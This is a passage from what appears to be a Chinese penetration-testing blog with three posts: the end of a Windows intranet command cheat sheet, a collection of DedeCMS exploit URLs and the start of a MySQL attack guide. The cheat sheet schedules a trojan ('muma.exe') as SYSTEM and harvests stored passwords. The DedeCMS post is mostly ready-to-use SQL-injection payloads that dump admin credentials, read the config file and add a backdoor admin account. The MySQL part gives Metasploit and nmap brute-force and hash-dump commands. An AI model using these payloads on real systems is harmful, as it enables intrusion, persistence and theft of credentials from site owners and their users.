<td>schtasks.exe  /Create /RU”SYSTEM” /SC MINUTE /MO 45 /TN FIREWALL /TR “c:/muma.ex    e” /ED 2017/4/7</td>
<td style="text-align:center">//添加计划任务</td>
</tr>
<tr>
<td>set KB2829361=MS13-046&amp;set KB2830290=MS13-046&amp;setKB2667440=MS12-020&amp;set KB2667402=MS12-020&amp;set KB3124280=MS16-016&amp;setKB3077657=MS15-077&amp;set KB3045171=MS15-051&amp;setKB2592799=MS11-080&amp;set KB952004=MS09-012 PR&amp;set KB956572=MS09-012 巴西烤肉&amp;set KB970483=MS09-020 iis6&amp;set KB2124261=MS10-065 ii7&amp;setKB2271195=MS10-065 ii7&amp;systeminfo&gt;a.txt&amp;(for %i in (KB952004 KB956572KB2393802 KB2503665 KB2592799 KB2621440 KB2160329 KB970483 KB2124261 KB977165KB958644 KB2667402 KB2667440 KB2830290 KB2829361 KB3045171 KB3077657 KB3124280)do @type a.txt</td>
<td style="text-align:center">@find /i “%i”</td>
<td></td>
<td>@echo %%i% Not Installed!)&amp;del /f/q /a a.txt    //windows未打补丁情况</td>
</tr>
<tr>
<td>REG query HKCU  /v “pwd” /s</td>
<td style="text-align:center">//获取保存到注册表中的密码</td>
</tr>
</tbody>
</table>
<h3 id="内网网络结常用命令："><a href="#内网网络结常用命令：" class="headerlink" title="内网网络结常用命令："></a>内网网络结常用命令：</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:center"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>tracert IP</td>
<td style="text-align:center">//路由跟踪</td>
</tr>
<tr>
<td>route print</td>
<td style="text-align:center">//打印路由表</td>
</tr>
<tr>
<td>arp -a</td>
<td style="text-align:center">//列出本网段内所有活跃的IP地址</td>
</tr>
<tr>
<td>arp -s （ip + mac）</td>
<td style="text-align:center">//绑定mac与ip地址</td>
</tr>
<tr>
<td>arp -d （ip + mac）</td>
<td style="text-align:center">//解绑mac与ip地址</td>
</tr>
<tr>
<td>nbtscan -r 192.168.16.0/24</td>
<td style="text-align:center">//通过小工具nbtscan扫描整个网络</td>
</tr>
<tr>
<td>netsh firewall show config</td>
<td style="text-align:center">//查看防火墙策略</td>
</tr>
<tr>
<td>netsh firewall show state</td>
<td style="text-align:center">//查看防火墙策略</td>
</tr>
<tr>
<td>for /l %i in (1,1,255) do @ping 10.0.0.%i -w 1 -n 1</td>
<td style="text-align:center">find /i”ttl”</td>
<td>//批量扫描内网存活主机</td>
</tr>
</tbody>
</table>
<h3 id="windows自带端口转发："><a href="#windows自带端口转发：" class="headerlink" title="windows自带端口转发："></a>windows自带端口转发：</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:center"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>netsh interface ipv6 install</td>
<td style="text-align:center">//首先安装IPV6（xp、2003下IPV6必须安装，否则端口转发不可用！）</td>
</tr>
<tr>
<td>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=22connectaddress=1.1.1.1 connectport=22</td>
<td style="text-align:center">//将本机22到1.1.1.1的22</td>
</tr>
<tr>
<td>netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=8.8.8.8 connectport=22</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td>netsh interface portproxy add v4tov4 listenaddress=192.168.193.1listenport=22 connectaddress=<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> connectport=22</td>
<td style="text-align:center"></td>
</tr>
<tr>
<td>netsh interface portproxy show all</td>
<td style="text-align:center">// 查看转发配置</td>
</tr>
<tr>
<td>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0listenport=22</td>
<td style="text-align:center">//删除配置</td>
</tr>
<tr>
<td>netsh firewall set portopening protocol=tcp port=22 name=Forwardmode=enable scope=all profile=all</td>
<td style="text-align:center">//添加防火墙规则，允许连接22：</td>
</tr>
</tbody>
</table>
<h3 id="敏感数据和目录："><a href="#敏感数据和目录：" class="headerlink" title="敏感数据和目录："></a>敏感数据和目录：</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:center"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>dir /b/s config.*</td>
<td style="text-align:center">//查看所在目录所有config.为前缀的文件</td>
</tr>
<tr>
<td>findstr /si password <em>.xml </em>.ini *.txt</td>
<td style="text-align:center">//查看后缀名文件中含有password关键字的文件</td>
</tr>
<tr>
<td>findstr /si login <em>.xml </em>.ini *.txt</td>
<td style="text-align:center">//查看后缀名文件中含有login关键字的文件</td>
</tr>
<tr>
<td>copy con</td>
<td style="text-align:center">创建命令：    </td>
</tr>
<tr>
<td>copy con  ftp.bat</td>
<td style="text-align:center">//创建ftp.bat批处理，然后输入ifconfig等命令，按ctr+z退出，并创建成功</td>
</tr>
<tr>
<td>copy con  test.vbs</td>
<td style="text-align:center">//创建test.vbs脚本，输入脚本后，按ctr+z退出，并创建成功</td>
</tr>
</tbody>
</table>
<h3 id="dsquery的AD查询工具："><a href="#dsquery的AD查询工具：" class="headerlink" title="dsquery的AD查询工具："></a>dsquery的AD查询工具：</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:center"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</td>
<td style="text-align:center">//列出该域内所有用户名</td>
</tr>
<tr>
<td>dsquery server -domain super.com</td>
<td style="text-align:center">dsget server -dnsname -site</td>
<td>//搜索域内所有域控制器并显示他们的DNS主机名和站点名称</td>
</tr>
<tr>
<td>dsquery contact</td>
<td style="text-align:center">//寻找目录中的联系人</td>
</tr>
<tr>
<td>dsquery subnet</td>
<td style="text-align:center">//列出该域内网段划分</td>
</tr>
<tr>
<td>query user</td>
<td style="text-align:center">//查询那些用户在线</td>
</tr>
<tr>
<td>dsquery group &amp;&amp; net group /domain</td>
<td style="text-align:center">//列出该域内分组</td>
</tr>
<tr>
<td>dsquery ou</td>
<td style="text-align:center">//列出该域内组织单位</td>
</tr>
<tr>
<td>dsquery server &amp;&amp; net time /domain</td>
<td style="text-align:center">//列出该域内域控制器</td>
</tr>
<tr>
<td>dsquery site -o rdn</td>
<td style="text-align:center">//搜索域中所有站点的名称</td>
</tr>
<tr>
<td>dsquery group dc=super,dc=com</td>
<td style="text-align:center">more</td>
<td>//搜索在DC=SUPER,DC=COM 域中的所有组</td>
</tr>
<tr>
<td>psloggedon.exe</td>
<td style="text-align:center">//查询那台主机和用户登录到该主机上</td>
</tr>
<tr>
<td>netsess.exe   //192.168.1.115</td>
<td style="text-align:center">//远程主机上无需管理员权限,查询到主机名和用户</td>
</tr>
<tr>
<td>reg query “HKEY_CURRENT_USER\SOFTWARE\MICROSOFT\TERMINAL SERVERCLIENT\DEFAULT”</td>
<td style="text-align:center">//获取最近mstsc</td>
<td>登录的记录</td>
</tr>
</tbody>
</table>
<h3 id="DOS常用快捷命令："><a href="#DOS常用快捷命令：" class="headerlink" title="DOS常用快捷命令："></a>DOS常用快捷命令：</h3><table>
<thead>
<tr>
<th></th>
<th style="text-align:center"></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>mspaint</td>
<td style="text-align:center">画图工具</td>
</tr>
<tr>
<td>calc</td>
<td style="text-align:center">计算器</td>
</tr>
<tr>
<td>notepad</td>
<td style="text-align:center">记事本</td>
</tr>
<tr>
<td>taskmgr</td>
<td style="text-align:center">任务管理器</td>
</tr>
<tr>
<td>osk</td>
<td style="text-align:center">打开屏幕键盘</td>
</tr>
<tr>
<td>gpedit.msc</td>
<td style="text-align:center">组策略</td>
</tr>
<tr>
<td>services.msc</td>
<td style="text-align:center">本地服务</td>
</tr>
<tr>
<td>compmgmt.msc</td>
<td style="text-align:center">计算机管理</td>
</tr>
<tr>
<td>devmgmt.msc</td>
<td style="text-align:center">设备管理器</td>
</tr>
<tr>
<td>winver</td>
<td style="text-align:center">查看系统版本</td>
</tr>
<tr>
<td>magnify</td>
<td style="text-align:center">放大镜实用程序</td>
</tr>
<tr>
<td>eventvwr</td>
<td style="text-align:center">事件查看器</td>
</tr>
<tr>
<td>Regedit</td>
<td style="text-align:center">打开注册表</td>
</tr>
<tr>
<td>resmon</td>
<td style="text-align:center">资源监视器</td>
</tr>
<tr>
<td>WMIC BIOS get releasedate</td>
<td style="text-align:center">查看电脑生产日期</td>
</tr>
<tr>
<td>mstsc -f</td>
<td style="text-align:center">远程连接（可以全屏）</td>
</tr>
</tbody>
</table>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/内网/">内网</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/dedeCMS常用EXP/" title="dedeCMS常用EXP" itemprop="url">dedeCMS常用EXP</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <p>常用到的EXP，还再不断更新中。。。。。。。。</p>
<h3 id="读取数据库"><a href="#读取数据库" class="headerlink" title="读取数据库"></a>读取数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtcl.com/plus/download.php?open=2&amp;id=49&amp;uhash=(SELECT 2019 FROM(SELECT COUNT(*),CONCAT(0x71786b7071,(SELECT (ELT(2019=2019,1))),0x71766a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a),</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtcl.com/plus/download.php?open=2&amp;id=49) AND 1313=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(107)||CHR(112)||CHR(113)||(SELECT (CASE WHEN (1313=1313) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(106)||CHR(107)||CHR(113)||CHR(62))) FROM DUAL) AND (1196=1196&amp;uhash=c9fc0f71f40f773f19a61e81</span><br></pre></td></tr></table></figure>
<h3 id="直接进后台"><a href="#直接进后台" class="headerlink" title="直接进后台"></a>直接进后台</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xx.com/织梦网站后台/login.php?dopost=login&amp;validate=dcug&amp;userid=admin&amp;<span class="built_in">pwd</span>=inimda&amp;_POST[GLOBALS][cfg_dbhost]=116.255.183.90&amp;_POST[GLOBALS][cfg_dbuser]=root&amp;_POST[GLOBALS][cfg_dbpwd]=r0t0&amp;_POST[GLOBALS][cfg_dbname]=root</span><br></pre></td></tr></table></figure>
<h3 id="爆数据库配置文件："><a href="#爆数据库配置文件：" class="headerlink" title="爆数据库配置文件："></a>爆数据库配置文件：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/search.php?keyword=xxx&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=102&amp;arrs1[]=95&amp;arrs1[]=115&amp;arrs1[]=116&amp;arrs1[]=121&amp;arrs1[]=108&amp;arrs1[]=101&amp;arrs2[]=47&amp;arrs2[]=46&amp;arrs2[]=46&amp;arrs2[]=47&amp;arrs2[]=46&amp;arrs2[]=46&amp;arrs2[]=47&amp;arrs2[]=100&amp;arrs2[]=97&amp;arrs2[]=116&amp;arrs2[]=97&amp;arrs2[]=47&amp;arrs2[]=99&amp;arrs2[]=111&amp;arrs2[]=109&amp;arrs2[]=109&amp;arrs2[]=111&amp;arrs2[]=110&amp;arrs2[]=46&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=99&amp;arrs2[]=46&amp;arrs2[]=112&amp;arrs2[]=104&amp;arrs2[]=112&amp;arrs2[]=0</span><br></pre></td></tr></table></figure>
<h3 id="爆密码："><a href="#爆密码：" class="headerlink" title="爆密码："></a>爆密码：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/recommend.php?aid=1&amp;_FILES[<span class="built_in">type</span>][name]&amp;_FILES[<span class="built_in">type</span>][size]&amp;_FILES[<span class="built_in">type</span>][<span class="built_in">type</span>]&amp;_FILES[<span class="built_in">type</span>][tmp_name]=aa\<span class="string">'and+char(@`'</span>`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,group_concat(userid,0x23,<span class="built_in">pwd</span>),5,6,7,8,9 from `%23@__admin`%23</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/recommend.php?action=&amp;aid=1&amp;_FILES[<span class="built_in">type</span>][tmp_name]=\<span class="string">' or mid=@`\'</span>` /*!50000union*//*!50000select*/1,2,3,(select CONCAT(0x7c,userid,0x7c,<span class="built_in">pwd</span>)+from+`%23@__admin` <span class="built_in">limit</span>+0,1),5,6,7,8,9%23@`\<span class="string">'`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=6873</span></span><br></pre></td></tr></table></figure>
<h3 id="爆数据库错误配置信息：查后台"><a href="#爆数据库错误配置信息：查后台" class="headerlink" title="爆数据库错误配置信息：查后台:"></a>爆数据库错误配置信息：查后台:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/mysqli_error_trace.inc</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/mysql_error_trace.inc</span><br></pre></td></tr></table></figure>
<h3 id="添加后台登录用户spider密码admin："><a href="#添加后台登录用户spider密码admin：" class="headerlink" title="添加后台登录用户spider密码admin："></a>添加后台登录用户spider密码admin：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/plus/download.php?open=1&amp;arrs1[]=99&amp;arrs1[]=102&amp;arrs1[]=103&amp;arrs1[]=95&amp;arrs1[]=100&amp;arrs1[]=98&amp;arrs1[]=112&amp;arrs1[]=114&amp;arrs1[]=101&amp;arrs1[]=102&amp;arrs1[]=105&amp;arrs1[]=120&amp;arrs2[]=97&amp;arrs2[]=100&amp;arrs2[]=109&amp;arrs2[]=105&amp;arrs2[]=110&amp;arrs2[]=96&amp;arrs2[]=32&amp;arrs2[]=83&amp;arrs2[]=69&amp;arrs2[]=84&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=117&amp;arrs2[]=115&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=115&amp;arrs2[]=112&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=39&amp;arrs2[]=44&amp;arrs2[]=32&amp;arrs2[]=96&amp;arrs2[]=112&amp;arrs2[]=119&amp;arrs2[]=100&amp;arrs2[]=96&amp;arrs2[]=61&amp;arrs2[]=39&amp;arrs2[]=102&amp;arrs2[]=50&amp;arrs2[]=57&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=55&amp;arrs2[]=97&amp;arrs2[]=53&amp;arrs2[]=97&amp;arrs2[]=55&amp;arrs2[]=52&amp;arrs2[]=51&amp;arrs2[]=56&amp;arrs2[]=57&amp;arrs2[]=52&amp;arrs2[]=97&amp;arrs2[]=48&amp;arrs2[]=101&amp;arrs2[]=52&amp;arrs2[]=39&amp;arrs2[]=32&amp;arrs2[]=119&amp;arrs2[]=104&amp;arrs2[]=101&amp;arrs2[]=114&amp;arrs2[]=101&amp;arrs2[]=32&amp;arrs2[]=105&amp;arrs2[]=100&amp;arrs2[]=61&amp;arrs2[]=49&amp;arrs2[]=32&amp;arrs2[]=35</span><br></pre></td></tr></table></figure>
<h3 id="通杀注入-："><a href="#通杀注入-：" class="headerlink" title="通杀注入 ："></a>通杀注入 ：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试/plus/search.php?keyword=as&amp;typeArr[ uNion ]=a</span><br></pre></td></tr></table></figure>
<p>出现 step 2:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.hack918.com/plus/search.php?keyword=as&amp;typeArr[111%3D@`\<span class="string">'`)+UnIon+seleCt+1,2,3,4,5,6,7,8,9,10,userid,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,pwd,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42+from+`%23@__admin`%23@`\'</span>`+]=a</span><br></pre></td></tr></table></figure></p>
<p>出现 step 1,那么直接用下面的exp<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.hack918.com/plus/search.php?keyword=as&amp;typeArr[111%3D@`\<span class="string">'`)+and+(SELECT+1+FROM+(select+count(*),concat(floor(rand(0)*2),(substring((select+CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`+limit+0,1),1,62)))a+from+information_schema.tables+group+by+a)b)%23@`\'</span>`+]=a爆账号密码</span><br></pre></td></tr></table></figure></p>
<h3 id="dede有会员功能的利用方式"><a href="#dede有会员功能的利用方式" class="headerlink" title="dede有会员功能的利用方式"></a>dede有会员功能的利用方式</h3><p>首先访问<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/data/admin/ver.txt  //页面获取系统最后升级时间</span><br></pre></td></tr></table></figure></p>
<p>然后访问下面地址,发现页面显示 “朋友” “修改”，说明该页面讯在漏洞。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/member/ajax_membergroup.php?action=post&amp;membergroup=1</span><br></pre></td></tr></table></figure></p>
<p>通过SQL语句爆出管理员账号：admin。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/member/ajax_membergroup.php?action=post&amp;membergroup=@`<span class="string">'`%20Union%20select%20userid%20from%20`%23@__admin`%20where%201%20or%20id=@`'</span>`</span><br></pre></td></tr></table></figure></p>
<p>通过SQL语句爆出管理员密码：23a7bbd73250516f069，类似md5的加密，去掉前三位最后一位变成7bbd73250516f06的md5加密，解密出来为admin123。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/member/ajax_membergroup.php?action=post&amp;membergroup=@`<span class="string">'`%20Union%20select%20pwd%20from%20`%23@__admin`%20where%201%20or%20id=@</span></span><br></pre></td></tr></table></figure></p>

        
        
        <p class="article-more-link">
          
       </p>
    </div>
    <footer class="article-footer clearfix">
<div class="article-catetags">

<div class="article-categories">
  <span></span>
  <a class="article-category-link" href="/categories/渗透测试/">渗透测试</a>►<a class="article-category-link" href="/categories/渗透测试/CMS/">CMS</a>
</div>


</div>




<div class="comments-count">
	
</div>

</footer>


    </article>






   
    
    <article class="post-expand [layout]" itemprop="articleBody"> 
        <header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2016/01/01/Mysql数据库渗透及漏洞利用总结/" title="Mysql数据库渗透及漏洞利用总结" itemprop="url">Mysql数据库渗透及漏洞利用总结</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
		
  <p class="article-time">
    <time datetime="2016-01-01T02:10:50.000Z" itemprop="datePublished"> 发表于 2016-01-01</time>
    
  </p>
</header>
    <div class="article-content">
        
        <h1 id="Mysql信息收集"><a href="#Mysql信息收集" class="headerlink" title="Mysql信息收集"></a>Mysql信息收集</h1><h2 id="1-端口信息收集"><a href="#1-端口信息收集" class="headerlink" title="1.端口信息收集"></a>1.端口信息收集</h2><p>Mysql默认端口是3306端口，但也有自定义端口，针对默认端口</p>
<p>扫描主要利用扫描软件进行探测，推荐使用：</p>
<p>（1）iisputter，直接填写3306端口，IP地址填写单个或者C段</p>
<p>地址。</p>
<p>（2）nmap扫描nmap -p 3306 192.168.1.1-254</p>
<p>特定目标的渗透，可能需要对全端口进行扫描，可以使用Nmap对</p>
<p>某一个IP地址进行全端口扫描，端口扫描软件还有sfind等DOS下</p>
<p>扫描的工具。</p>
<h2 id="版本信息收集"><a href="#版本信息收集" class="headerlink" title="版本信息收集"></a>版本信息收集</h2><p>（1）msf查看版本信息auxiliary/scanner/mysql/mysql_version模块，以扫描主机192.168.157.130为例，命令为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> use auxiliary/scanner/mysql/mysql_version</span><br><span class="line"><span class="built_in">set</span> rhosts 192.168.157.130</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>(2）mysql查询版本命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version`、`SELECT  version();</span><br></pre></td></tr></table></figure></p>
<p>(3)sqlmap通过注入点扫描确认信息：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u url --dbms mysql</span><br></pre></td></tr></table></figure></p>
<p>（4）phpmyadmin管理页面登录后查看localhost-&gt;变量-&gt;服务器变量和设置中的version参数值。</p>
<h2 id="数据库管理信息收集"><a href="#数据库管理信息收集" class="headerlink" title="数据库管理信息收集"></a>数据库管理信息收集</h2><p>Mysql管理工具有多种，例如phpmyadmin网站管理，Navicat forMySQL以及MysqlFront等客户端工具。这些工具有的会直接保存配置信息，这些信息包含数据库服务器地址和数据库用户名以及密码，通过嗅探或者破解配置文件可以获取密码等信息。</p>
<h2 id="msf信息收集模块"><a href="#msf信息收集模块" class="headerlink" title="msf信息收集模块"></a>msf信息收集模块</h2><p>（1）mysql哈希值枚举<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_hashdump</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>（2）获取相关信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/mysql/mysql_enum</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>获取数据库版本，操作系统名称，架构，数据库目录，数据库用户以及密码哈希值。</p>
<p>（3）执行mysql语句，连接成功后可以在msf执行sql语句，跟sqlmap的–sql-shell模块类似。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/mysql/mysql_sql</span><br></pre></td></tr></table></figure></p>
<p>（4）将mysql_schem导出到本地 /root/.msf4/loot/文件夹下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_schemadump</span><br></pre></td></tr></table></figure></p>
<p>（5）文件枚举和目录可写信息枚举<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_file_enum</span><br><span class="line">auxiliary/scanner/mysql/mysql_writable_dirs</span><br></pre></td></tr></table></figure></p>
<p>没有测试成功过，需要定义枚举目录和相关文件，觉得基本没有啥用。</p>
<h1 id="Mysql密码获取"><a href="#Mysql密码获取" class="headerlink" title="Mysql密码获取"></a>Mysql密码获取</h1><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>Mysql暴力破解主要有几种：</p>
<h3 id="网页在线连接破解"><a href="#网页在线连接破解" class="headerlink" title="网页在线连接破解"></a>网页在线连接破解</h3><p>可以使用burpsuite和phpMyAdmin多线程批量破解工具。 下载：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://portswigger.net/burp</span><br><span class="line">http://pan.baidu.com/s/1c1LD6co</span><br></pre></td></tr></table></figure></p>
<h3 id="msf通过命令行进行暴力破解"><a href="#msf通过命令行进行暴力破解" class="headerlink" title="msf通过命令行进行暴力破解"></a>msf通过命令行进行暴力破解</h3><p>msf破解mysql密码模块auxiliary/scanner/mysql/mysql_login，其参数主要有<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">BLANK_PASSWORDS</span><br><span class="line">BRUTEFORCE_SPEED</span><br><span class="line">DB_ALL_CREDS</span><br><span class="line">DB_ALL_PASS</span><br><span class="line">DB_ALL_USERS</span><br><span class="line">PASSWORD</span><br><span class="line">PASS_FILE</span><br><span class="line">Proxies</span><br><span class="line">RHOSTS</span><br><span class="line">RPORT</span><br><span class="line">STOP_ON_SUCCESS</span><br><span class="line">THREADS</span><br><span class="line">USERNAME</span><br><span class="line">USERPASS_FILE</span><br><span class="line">USER_AS_PASS</span><br><span class="line">USER_FILE</span><br><span class="line">VERBOSE</span><br></pre></td></tr></table></figure></p>
<p>对单一主机仅仅需要设置<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">RHOSTS</span><br><span class="line">RPORT</span><br><span class="line">USERNAME</span><br><span class="line">PASSWORD</span><br><span class="line">PASS_FILE</span><br></pre></td></tr></table></figure></p>
<p>其它参数根据实际情况进行设置。</p>
<p>（1）场景A：对内网获取root某一个口令后，扩展渗透<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.157.1-254</span><br><span class="line"><span class="built_in">set</span> password root</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p>执行后对192.168.157.1-254进行mysql密码扫描验证。</p>
<p>（2）场景B：使用密码字典进行扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mysql/mysql_login</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.157.1-254</span><br><span class="line"><span class="built_in">set</span> pass_file /tmp/password.txt</span><br><span class="line"><span class="built_in">set</span> username root</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<h3 id="使用nmap扫描并破解密码"><a href="#使用nmap扫描并破解密码" class="headerlink" title="使用nmap扫描并破解密码"></a>使用nmap扫描并破解密码</h3><p>（1）对某一个IP或者IP地址段进行nmap默认密码暴力破解并扫描<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap --script=mysql-brute 192.168.157.130</span><br><span class="line">nmap --script=mysql-brute 192.168.157.1-254</span><br></pre></td></tr></table></figure></p>
<p>（2）使用root账号root密码进行mysql密码验证并扫描获取指定IP地址的端口信息以及mysql数据库相关信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script=mysql-databases--script-argsmysqluser=root,mysqlpass=root 192.168.157.130</span><br></pre></td></tr></table></figure></p>
<p>（3）检查root空口令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script mysql-empty-password 192.168.195.130</span><br></pre></td></tr></table></figure></p>
